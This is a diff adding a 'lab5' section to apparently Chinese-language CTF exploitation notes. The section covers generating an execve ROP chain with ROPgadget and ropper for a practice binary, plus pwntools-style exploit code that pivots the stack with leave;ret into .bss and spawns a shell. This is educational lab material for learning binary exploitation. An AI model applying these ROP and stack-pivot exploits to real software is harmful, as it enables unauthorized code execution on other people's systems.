@@ -302,3 +302,27 @@ constraints:
     sl(p)
     r.interactive()
 ```
+# lab5
+使用ROPgadget --binary simplerop --ropchain生成的ropchain长度为136
+使用[ropper](https://github.com/sashs/Ropper)的长度为96，而且生成的py文件中有imaage_base方便修改
+
+```
+pip install ropper
+ropper --file simplerop --chain execve
+```
+
+但是stack中间不够，使用leave ret进行栈迁移
+leave = mov sb,bp;pop bp
+
+```
+    leave_ret=0x8048e6e
+    ru(':')
+    payload='a'*0x14+'a'*8+p32(elf.bss())+p32(elf.symbols['read'])+p32(leave_ret)+p32(0)+p32(elf.bss())+p32(0x100)
+    info(len(payload))
+    sl(payload)
+
+    import ropchain
+    sl('a'*4+ropchain.p)
+    r.interactive()
+```
+
